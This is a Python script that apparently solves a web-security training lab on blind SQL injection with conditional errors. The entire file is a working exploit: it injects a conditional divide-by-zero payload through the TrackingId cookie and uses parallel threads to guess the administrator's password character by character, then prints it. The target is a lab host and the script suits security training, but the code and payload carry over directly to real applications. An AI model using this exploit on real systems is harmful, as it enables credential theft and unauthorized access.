# LAB: Blind SQL injection with conditional errors

import requests
from threading import Thread
import time

start_time = time.time()

# URL LAB ID
url = 'https://0a2000f304a9b669808d034b0099006a.web-security-academy.net'

threads = []
admin_pass = [''] * 20

def find_character(i):
    for ascii_value in range(32,127):
        response = requests.get(url, cookies={"TrackingId" : f"' || (select case when (ascii(substr(password, {i+1}, 1)) = {ascii_value}) then 1/0 else NULL end from users where username='administrator' ) -- "})
        if 'Internal Server Error' in response.text:
            admin_pass[i] = chr(ascii_value)
            return

for i in range(20):
    threads.append(Thread(target=find_character, args=(i,)))
    threads[i].start()

for i in range(20):
    threads[i].join()

print(f"Administrator password: {''.join(admin_pass)}")
print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))